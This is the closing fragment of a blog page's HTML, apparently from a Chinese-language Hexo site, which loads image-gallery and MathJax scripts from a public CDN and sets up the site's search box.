    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script type="text/x-mathjax-config">MathJax.Hub.Config({
            'HTML-CSS': {
                matchFontHeight: false
            },
            SVG: {
                matchFontHeight: false
            },
            CommonHTML: {
                matchFontHeight: false
            },
            tex2jax: {
                inlineMath: [
                    ['$','$'],
                    ['\\(','\\)']
                ]
            }
        });</script><script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.9/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>